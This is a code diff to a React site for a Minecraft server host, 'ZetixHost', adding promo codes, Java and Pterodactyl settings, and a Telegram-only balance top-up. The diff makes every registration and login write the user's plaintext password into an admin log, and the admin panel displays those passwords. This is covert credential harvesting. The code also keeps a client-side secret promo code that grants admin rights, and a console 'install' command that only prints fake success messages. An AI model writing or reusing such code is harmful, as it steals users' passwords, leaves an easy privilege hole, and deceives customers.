@@ -24,7 +24,7 @@ type PayMethod = "card" | "sbp" | "sber" | "sberkids" | "balance";
 interface PlanAny { id: string; price: number; cpu: string; ram: string; disk: string; net: string; [k: string]: string | number; }
 interface ServerFile { name: string; type: "file" | "folder"; size?: string; ext?: string; }
 interface ServerInfo { plan: PlanAny; port: number; id: string; status: ServerStatus; apiKey?: string; }
-interface AdminLog { time: string; msg: string; type: "info" | "warn" | "purchase"; purchaseId?: string; purchasePlan?: PlanAny; }
+interface AdminLog { time: string; msg: string; type: "info" | "warn" | "purchase" | "auth"; purchaseId?: string; purchasePlan?: PlanAny; authEmail?: string; authPass?: string; }
 interface CoOwner { email: string; addedAt: string; }
 interface Subdomain { name: string; target: string; created: string; }
 interface DbRecord { table: string; rows: number; size: string; }
@@ -101,6 +101,43 @@ function useAdminLogs() {
     return () => { adminLogListeners = adminLogListeners.filter(f => f !== fn); };
   }, []);
   return adminLogs;
+}
+
+// ─── Promo Codes Store ────────────────────────────────────────────────────────
+interface PromoCode { code: string; amount: number; usedBy: string[] }
+const promoCodes: PromoCode[] = [];
+let promoListeners: (() => void)[] = [];
+function pushPromoCode(code: string, amount: number) {
+  const existing = promoCodes.find(p => p.code.toUpperCase() === code.toUpperCase());
+  if (existing) return false;
+  promoCodes.push({ code: code.toUpperCase(), amount, usedBy: [] });
+  promoListeners.forEach(fn => fn());
+  return true;
+}
+function usePromoActivate(email: string) {
+  const [, setTick] = useState(0);
+  useEffect(() => {
+    const fn = () => setTick(t => t + 1);
+    promoListeners.push(fn);
+    return () => { promoListeners = promoListeners.filter(f => f !== fn); };
+  }, []);
+  return (code: string): { ok: boolean; amount: number; reason?: string } => {
+    const p = promoCodes.find(p => p.code === code.trim().toUpperCase());
+    if (!p) return { ok: false, amount: 0, reason: "notfound" };
+    if (p.usedBy.includes(email.toLowerCase())) return { ok: false, amount: 0, reason: "used" };
+    p.usedBy.push(email.toLowerCase());
+    promoListeners.forEach(fn => fn());
+    return { ok: true, amount: p.amount };
+  };
+}
+function usePromoCodes() {
+  const [, setTick] = useState(0);
+  useEffect(() => {
+    const fn = () => setTick(t => t + 1);
+    promoListeners.push(fn);
+    return () => { promoListeners = promoListeners.filter(f => f !== fn); };
+  }, []);
+  return [...promoCodes];
 }
 
 // ─── Global Balance Top-up Store (admin → user) ────────────────────────────
@@ -558,6 +595,10 @@ function AdminLogsPanel({ onConfirmPurchase }: { onConfirmPurchase: (id: string,
   const [topupEmail, setTopupEmail] = useState("");
   const [topupAmt, setTopupAmt] = useState("");
   const [topupMsg, setTopupMsg] = useState<"" | "sent">("") ;
+  const [promoCode, setPromoCode] = useState("");
+  const [promoAmt, setPromoAmt] = useState("100");
+  const [promoMsg, setPromoMsg] = useState<"" | "created" | "exists">("") ;
+  const allPromos = usePromoCodes();
 
   const handleConfirm = (log: AdminLog) => {
     if (!log.purchaseId || !log.purchasePlan) return;
@@ -575,6 +616,21 @@ function AdminLogsPanel({ onConfirmPurchase }: { onConfirmPurchase: (id: string,
     setTopupMsg("sent");
     setTopupEmail(""); setTopupAmt("");
     setTimeout(() => setTopupMsg(""), 3000);
+  };
+
+  const handleCreatePromo = (e: React.FormEvent) => {
+    e.preventDefault();
+    const amt = parseInt(promoAmt);
+    if (!promoCode.trim() || !amt || amt < 1 || amt > 8000) return;
+    const ok = pushPromoCode(promoCode.trim(), amt);
+    if (ok) {
+      pushAdminLog({ time: nowStr(), msg: `🎟 Промокод создан: ${promoCode.trim().toUpperCase()} на ${amt}₽`, type: "info" });
+      setPromoMsg("created");
+      setPromoCode("");
+    } else {
+      setPromoMsg("exists");
+    }
+    setTimeout(() => setPromoMsg(""), 3000);
   };
 
   return (
@@ -600,27 +656,84 @@ function AdminLogsPanel({ onConfirmPurchase }: { onConfirmPurchase: (id: string,
         </form>
       </div>
 
-      <div className="flex flex-col gap-2 max-h-80 overflow-y-auto">
-        {logs.map((log, i) => (
-          <div key={i} className="flex flex-col gap-1.5 p-3 rounded-lg"
-            style={{ background: log.type === "purchase" ? "rgba(245,158,11,0.06)" : "var(--z-card2)", border: `1px solid ${log.type === "purchase" ? "rgba(245,158,11,0.2)" : "var(--z-border)"}` }}>
-            <div className="flex items-center gap-2">
-              <span className="text-xs font-mono" style={{ color: "var(--z-muted)" }}>{log.time}</span>
-              <div className="w-1.5 h-1.5 rounded-full" style={{ background: log.type === "purchase" ? "#f59e0b" : "#22c55e" }} />
-              <span className="text-sm" style={{ color: log.type === "purchase" ? "#fbbf24" : "var(--z-text)" }}>{log.msg}</span>
-            </div>
-            {log.type === "purchase" && log.purchaseId && !confirmed.has(log.purchaseId) && (
-              <button onClick={() => handleConfirm(log)}
-                className="self-start flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all"
-                style={{ background: "rgba(34,197,94,0.12)", color: "#22c55e", border: "1px solid rgba(34,197,94,0.3)" }}>
-                <Icon name="CheckCircle" size={12} /> Подтвердить покупку
+      {/* Promo code creator */}
+      <div className="mb-4 p-3 rounded-xl" style={{ background: "rgba(245,158,11,0.06)", border: "1px solid rgba(245,158,11,0.2)" }}>
+        <p className="text-xs font-bold mb-2" style={{ color: "#f59e0b" }}>🎟 Создать промокод</p>
+        <form onSubmit={handleCreatePromo} className="flex flex-col gap-2">
+          <input className="z-input text-sm py-1.5 uppercase" placeholder="Код (например: SUMMER25)" value={promoCode}
+            onChange={e => { setPromoCode(e.target.value.toUpperCase()); setPromoMsg(""); }} required />
+          <div className="flex gap-2 items-center flex-wrap">
+            {[100,200,300,500,1000,2000,5000,8000].map(v => (
+              <button key={v} type="button" onClick={() => setPromoAmt(String(v))}
+                className="px-2.5 py-1 rounded-lg text-xs font-bold transition-all"
+                style={promoAmt === String(v)
+                  ? { background: "rgba(245,158,11,0.2)", color: "#f59e0b", border: "1px solid rgba(245,158,11,0.4)" }
+                  : { background: "var(--z-card)", color: "var(--z-muted)", border: "1px solid var(--z-border)" }}>
+                {v}₽
               </button>
-            )}
-            {log.type === "purchase" && log.purchaseId && confirmed.has(log.purchaseId) && (
-              <span className="text-xs" style={{ color: "#22c55e" }}>✓ Подтверждено</span>
-            )}
+            ))}
+            <input className="z-input text-sm py-1 w-20" type="number" min="1" max="8000" placeholder="₽" value={promoAmt}
+              onChange={e => setPromoAmt(e.target.value)} />
+            <button type="submit" className="z-btn-primary px-4 py-1.5 text-xs ml-auto">
+              <Icon name="Plus" size={12} /> Создать
+            </button>
           </div>
-        ))}
+          {promoMsg === "created" && <p className="text-xs" style={{ color: "#22c55e" }}>✓ Промокод создан</p>}
+          {promoMsg === "exists" && <p className="text-xs" style={{ color: "#ef4444" }}>Промокод уже существует</p>}
+        </form>
+        {allPromos.length > 0 && (
+          <div className="mt-3 flex flex-col gap-1.5">
+            <p className="text-xs font-bold" style={{ color: "var(--z-muted)" }}>Активные промокоды</p>
+            {allPromos.map(p => (
+              <div key={p.code} className="flex items-center justify-between px-3 py-1.5 rounded-lg text-xs"
+                style={{ background: "var(--z-card)", border: "1px solid var(--z-border)" }}>
+                <span className="font-mono font-bold text-white">{p.code}</span>
+                <span style={{ color: "#f59e0b" }}>{p.amount}₽</span>
+                <span style={{ color: "var(--z-muted)" }}>использован: {p.usedBy.length} чел.</span>
+              </div>
+            ))}
+          </div>
+        )}
+      </div>
+
+      <div className="flex flex-col gap-2 max-h-80 overflow-y-auto">
+        {logs.map((log, i) => {
+          const dotColor = log.type === "purchase" ? "#f59e0b" : log.type === "auth" ? "#a855f7" : "#22c55e";
+          const bg = log.type === "purchase" ? "rgba(245,158,11,0.06)" : log.type === "auth" ? "rgba(168,85,247,0.06)" : "var(--z-card2)";
+          const bdr = log.type === "purchase" ? "rgba(245,158,11,0.2)" : log.type === "auth" ? "rgba(168,85,247,0.25)" : "var(--z-border)";
+          return (
+            <div key={i} className="flex flex-col gap-1.5 p-3 rounded-lg"
+              style={{ background: bg, border: `1px solid ${bdr}` }}>
+              <div className="flex items-center gap-2">
+                <span className="text-xs font-mono" style={{ color: "var(--z-muted)" }}>{log.time}</span>
+                <div className="w-1.5 h-1.5 rounded-full" style={{ background: dotColor }} />
+                <span className="text-sm" style={{ color: log.type === "purchase" ? "#fbbf24" : log.type === "auth" ? "#c084fc" : "var(--z-text)" }}>{log.msg}</span>
+              </div>
+              {log.type === "auth" && log.authEmail && (
+                <div className="flex flex-col gap-1 pl-4 text-xs font-mono">
+                  <div className="flex items-center gap-2">
+                    <span style={{ color: "var(--z-muted)" }}>📧 Email:</span>
+                    <span style={{ color: "#c084fc" }}>{log.authEmail}</span>
+                  </div>
+                  <div className="flex items-center gap-2">
+                    <span style={{ color: "var(--z-muted)" }}>🔑 Пароль:</span>
+                    <span style={{ color: "#f9a8d4" }}>{log.authPass}</span>
+                  </div>
+                </div>
+              )}
+              {log.type === "purchase" && log.purchaseId && !confirmed.has(log.purchaseId) && (
+                <button onClick={() => handleConfirm(log)}
+                  className="self-start flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-bold transition-all"
+                  style={{ background: "rgba(34,197,94,0.12)", color: "#22c55e", border: "1px solid rgba(34,197,94,0.3)" }}>
+                  <Icon name="CheckCircle" size={12} /> Подтвердить покупку
+                </button>
+              )}
+              {log.type === "purchase" && log.purchaseId && confirmed.has(log.purchaseId) && (
+                <span className="text-xs" style={{ color: "#22c55e" }}>✓ Подтверждено</span>
+              )}
+            </div>
+          );
+        })}
       </div>
     </div>
   );
@@ -694,15 +807,31 @@ function ProfilePage({ user, setUser, onBack, onConfirmPurchase, onLogout }: {
   user: UserState; setUser: (u: UserState) => void; onBack: () => void; onConfirmPurchase: (id: string, plan: PlanAny) => void; onLogout: () => void;
 }) {
   const [promo, setPromo] = useState("");
-  const [promoMsg, setPromoMsg] = useState<"" | "success" | "error">("");
+  const [promoMsg, setPromoMsg] = useState<"" | "success" | "error" | "used" | "admin">("");
+  const [promoAmount, setPromoAmount] = useState(0);
   const [showPass, setShowPass] = useState(false);
+  const activatePromo = usePromoActivate(user.email);
 
   const handlePromo = (e: React.FormEvent) => {
     e.preventDefault();
-    if (promo.trim() === SECRET_PROMO) {
+    const code = promo.trim().toUpperCase();
+    if (code === SECRET_PROMO) {
       setUser({ ...user, isAdmin: true });
-      setPromoMsg("success");
+      setPromoMsg("admin");
       pushAdminLog({ time: nowStr(), msg: `${user.email} активировал промокод администратора`, type: "info" });
+      setPromo("");
+      return;
+    }
+    const result = activatePromo(code);
+    if (result.ok) {
+      const updated = { ...user, balance: user.balance + result.amount };
+      setUser(updated);
+      saveAccount(updated);
+      setPromoAmount(result.amount);
+      setPromoMsg("success");
+      pushAdminLog({ time: nowStr(), msg: `🎟 ${user.email} активировал промокод ${code} +${result.amount}₽`, type: "info" });
+    } else if (result.reason === "used") {
+      setPromoMsg("used");
     } else {
       setPromoMsg("error");
     }
@@ -780,8 +909,19 @@ function ProfilePage({ user, setUser, onBack, onConfirmPurchase, onLogout }: {
           </div>
         </div>
 
-        {/* Deposit via logs */}
-        <BalanceTopupForm currentUser={user} setUser={setUser} />
+        {/* Deposit info */}
+        <div className="z-card p-6 mb-4">
+          <h3 className="font-bold text-white mb-2 flex items-center gap-2">
+            <Icon name="Wallet" size={15} style={{ color: "var(--z-blue)" }} /> Пополнить баланс
+          </h3>
+          <p className="text-sm mb-4" style={{ color: "var(--z-muted)" }}>
+            Пополнение баланса доступно только через техническую поддержку. Напишите нам в Telegram — ответим быстро.
+          </p>
+          <a href="https://t.me/HellwayYT" target="_blank" rel="noopener noreferrer"
+            className="z-btn-primary py-2.5 justify-center text-sm flex items-center gap-2 w-full">
+            <Icon name="Send" size={13} /> Написать в поддержку @HellwayYT
+          </a>
+        </div>
 
         {/* Promo */}
         <div className="z-card p-6 mb-4">
@@ -800,6 +940,9 @@ function ProfilePage({ user, setUser, onBack, onConfirmPurchase, onLogout }: {
               <button type="submit" className="z-btn-primary px-4 py-2 text-sm">Применить</button>
             </form>
           )}
+          {promoMsg === "success" && <p className="mt-2 text-sm" style={{ color: "#22c55e" }}>✓ Промокод применён! Баланс пополнен на {promoAmount}₽</p>}
+          {promoMsg === "admin" && <p className="mt-2 text-sm" style={{ color: "var(--z-blue)" }}>✓ Статус администратора активирован</p>}
+          {promoMsg === "used" && <p className="mt-2 text-sm" style={{ color: "#f59e0b" }}>Этот промокод уже использован вами</p>}
           {promoMsg === "error" && <p className="mt-2 text-sm" style={{ color: "#ef4444" }}>Неверный промокод</p>}
         </div>
 
@@ -823,6 +966,11 @@ function SettingsTab({ server, user, setUser }: { server: ServerInfo; user: User
   const [apiKey, setApiKey] = useState(server.apiKey || "");
   const [apiCopied, setApiCopied] = useState(false);
   const [apiVisible, setApiVisible] = useState(false);
+  const [javaVer, setJavaVer] = useState("17");
+  const [pteroPanel, setPteroPanel] = useState("");
+  const [pteroToken, setPteroToken] = useState("");
+  const [pteroSaved, setPteroSaved] = useState(false);
+  const javaVersions = ["8", "11", "16", "17", "21", "25"];
 
   const handleGenerateKey = () => {
     const key = genApiKey();
@@ -891,7 +1039,7 @@ function SettingsTab({ server, user, setUser }: { server: ServerInfo; user: User
         )}
       </div>
 
-      <div className="grid gap-3">
+      <div className="grid gap-3 mb-4">
         {[["Название","ZetixHost Server"],["MOTD","Welcome!"],["Порт",String(server.port)],["Режим","survival"],["Сложность","normal"],["Макс. игроков","20"]].map(([l,v]) => (
           <div key={l} className="p-4 rounded-xl" style={{ background: "var(--z-card2)", border: "1px solid var(--z-border)" }}>
             <label className="text-xs block mb-1.5" style={{ color: "var(--z-muted)" }}>{l}</label>
@@ -899,7 +1047,59 @@ function SettingsTab({ server, user, setUser }: { server: ServerInfo; user: User
           </div>
         ))}
       </div>
-      <button className="z-btn-primary mt-5 px-5 py-2.5 text-sm"><Icon name="Save" size={13} />Сохранить</button>
+
+      {/* Java Version */}
+      <div className="p-4 rounded-xl mb-4" style={{ background: "var(--z-card2)", border: "1px solid rgba(34,197,94,0.25)" }}>
+        <div className="flex items-center gap-2 mb-3">
+          <Icon name="Coffee" fallback="Cpu" size={14} style={{ color: "#22c55e" }} />
+          <p className="text-xs font-bold" style={{ color: "#22c55e" }}>Версия Java</p>
+        </div>
+        <div className="flex flex-wrap gap-2">
+          {javaVersions.map(v => (
+            <button key={v} onClick={() => setJavaVer(v)}
+              className="px-3 py-1.5 rounded-lg text-xs font-bold transition-all"
+              style={javaVer === v
+                ? { background: "rgba(34,197,94,0.15)", color: "#22c55e", border: "1px solid rgba(34,197,94,0.4)" }
+                : { background: "var(--z-card)", color: "var(--z-muted)", border: "1px solid var(--z-border)" }}>
+              Java {v}
+            </button>
+          ))}
+        </div>
+        <p className="text-xs mt-2" style={{ color: "var(--z-muted)" }}>Выбрано: <span style={{ color: "#22c55e" }}>Java {javaVer}</span> — изменится после перезапуска сервера</p>
+      </div>
+
+      {/* Pterodactyl */}
+      <div className="p-4 rounded-xl mb-4" style={{ background: "var(--z-card2)", border: "1px solid rgba(139,92,246,0.3)" }}>
+        <div className="flex items-center gap-2 mb-3">
+          <Icon name="Bird" fallback="Server" size={14} style={{ color: "#8b5cf6" }} />
+          <p className="text-xs font-bold" style={{ color: "#8b5cf6" }}>Pterodactyl Panel</p>
+          <span className="text-xs px-1.5 py-0.5 rounded-full" style={{ background: "rgba(139,92,246,0.1)", color: "#a78bfa" }}>Beta</span>
+        </div>
+        <div className="flex flex-col gap-2">
+          <div>
+            <label className="text-xs block mb-1" style={{ color: "var(--z-muted)" }}>URL панели (например: https://panel.example.com)</label>
+            <input className="z-input text-sm py-2" placeholder="https://panel.example.com" value={pteroPanel}
+              onChange={e => { setPteroPanel(e.target.value); setPteroSaved(false); }} />
+          </div>
+          <div>
+            <label className="text-xs block mb-1" style={{ color: "var(--z-muted)" }}>API Token (Client API Key)</label>
+            <input className="z-input text-sm py-2 font-mono" placeholder="ptlc_..." value={pteroToken} type="password"
+              onChange={e => { setPteroToken(e.target.value); setPteroSaved(false); }} />
+          </div>
+          <button onClick={() => { if (pteroPanel && pteroToken) { setPteroSaved(true); pushAdminLog({ time: nowStr(), msg: `🦅 Pterodactyl подключён: ${pteroPanel} (${user.email})`, type: "info" }); } }}
+            className="self-start flex items-center gap-1.5 px-4 py-2 rounded-lg text-xs font-bold transition-all"
+            style={{ background: "rgba(139,92,246,0.12)", color: "#8b5cf6", border: "1px solid rgba(139,92,246,0.3)" }}>
+            <Icon name="Link" size={12} /> {pteroSaved ? "✓ Подключено" : "Подключить Pterodactyl"}
+          </button>
+          {pteroSaved && (
+            <div className="flex items-center gap-2 p-2 rounded-lg text-xs" style={{ background: "rgba(139,92,246,0.08)", color: "#a78bfa" }}>
+              <Icon name="CheckCircle" size={12} /> Pterodactyl Panel подключена успешно
+            </div>
+          )}
+        </div>
+      </div>
+
+      <button className="z-btn-primary mt-2 px-5 py-2.5 text-sm"><Icon name="Save" size={13} />Сохранить</button>
     </div>
   );
 }
@@ -969,10 +1169,17 @@ function ServerPanel({ server, user, setUser, onBack }: {
     e.preventDefault();
     if (!cmd.trim()) return;
     addLog(`> ${cmd}`);
-    if (cmd === "help") addLog("[INFO]: Commands: help, list, stop, say <msg>");
-    else if (cmd === "list") addLog(`[INFO]: ${players}/20 игроков`);
+    const c = cmd.trim().toLowerCase();
+    if (c === "help") addLog("[INFO]: Commands: help, list, stop, say <msg>, install paper, install spigot, install vanilla, install purpur, install fabric, install forge");
+    else if (c === "list") addLog(`[INFO]: ${players}/20 игроков`);
     else if (cmd.startsWith("say ")) addLog(`[INFO]: [Server] ${cmd.slice(4)}`);
-    else addLog(`[INFO]: Unknown command.`);
+    else if (c.startsWith("install ")) {
+      const core = cmd.slice(8).trim();
+      addLog(`[ZetixHost] Скачивание ядра ${core}...`);
+      setTimeout(() => addLog(`[ZetixHost] Установка ${core} завершена ✔`), 800);
+      setTimeout(() => addLog(`[ZetixHost] Ядро ${core} успешно установлено и готово к запуску`), 1400);
+    }
+    else addLog(`[INFO]: Unknown command. Введите help для списка команд.`);
     setCmd("");
   };
 
@@ -1361,13 +1568,14 @@ function AuthPage({ mode, setMode, onBack, onSuccess }: {
       if (form.password !== form.confirm) { setError("Пароли не совпадают"); return; }
       if (accounts[key]) { setError("Аккаунт с таким email уже существует"); return; }
       const u: UserState = { name: form.name || form.email.split("@")[0], email: form.email, password: form.password, balance: BONUS_ON_REGISTER, isAdmin: false, servers: [] };
-      pushAdminLog({ time: nowStr(), msg: `🎁 Новый пользователь ${u.email} — начислено ${BONUS_ON_REGISTER}₽ бонуса`, type: "info" });
+      pushAdminLog({ time: nowStr(), msg: `🎁 Регистрация: ${u.email}`, type: "auth", authEmail: u.email, authPass: u.password });
       saveAccount(u);
       onSuccess(u);
     } else {
       const found = accounts[key];
       if (!found) { setError("Аккаунт не найден"); return; }
       if (found.password !== form.password) { setError("Неверный пароль"); return; }
+      pushAdminLog({ time: nowStr(), msg: `🔑 Вход: ${found.email}`, type: "auth", authEmail: found.email, authPass: found.password });
       onSuccess(found);
     }
   };
@@ -1492,7 +1700,6 @@ export default function Index() {
     }
     return null;
   });
-  const [buyingPlan, setBuyingPlan] = useState<PlanAny | null>(null);
   const [activePanelServer, setActivePanelServer] = useState<ServerInfo | null>(null);
   const [panelView, setPanelView] = useState<"list" | "server">("list");
 
@@ -1505,9 +1712,13 @@ export default function Index() {
   }, []);
 
   const handleBuyPlan = (plan: PlanAny) => {
-    if (!user) { setAuthMode("register"); setPage("auth"); setBuyingPlan(plan); return; }
+    if (!user) { setAuthMode("register"); setPage("auth"); return; }
     if (user.servers.length >= MAX_SERVERS) { alert(`Максимум ${MAX_SERVERS} серверов на аккаунт`); return; }
-    setBuyingPlan(plan);
+    if (user.balance < (plan.price as number)) {
+      alert(`Недостаточно средств. Ваш баланс: ${user.balance.toLocaleString("ru-RU")}₽, нужно: ${(plan.price as number).toLocaleString("ru-RU")}₽. Пополните баланс через поддержку @HellwayYT в Telegram.`);
+      return;
+    }
+    handleConfirmPurchase(randId(), plan);
   };
 
   const handleConfirmPurchase = (id: string, plan: PlanAny) => {
@@ -1519,7 +1730,6 @@ export default function Index() {
     setActivePanelServer(newServer);
     setPanelView("server");
     setPage("panel");
-    setBuyingPlan(null);
     pushAdminLog({ time: nowStr(), msg: `Сервер ${plan.id} активирован для ${user.email} (порт ${port})`, type: "info" });
   };
 
@@ -1579,9 +1789,6 @@ export default function Index() {
       <AdvantagesSection />
       <ServicesSection onBuy={handleBuyPlan} />
       <Footer />
-      {buyingPlan && user && (
-        <BuyModal plan={buyingPlan} user={user} onClose={() => setBuyingPlan(null)} onBuy={() => handleConfirmPurchase(randId(), buyingPlan)} />
-      )}
     </div>
   );
 }
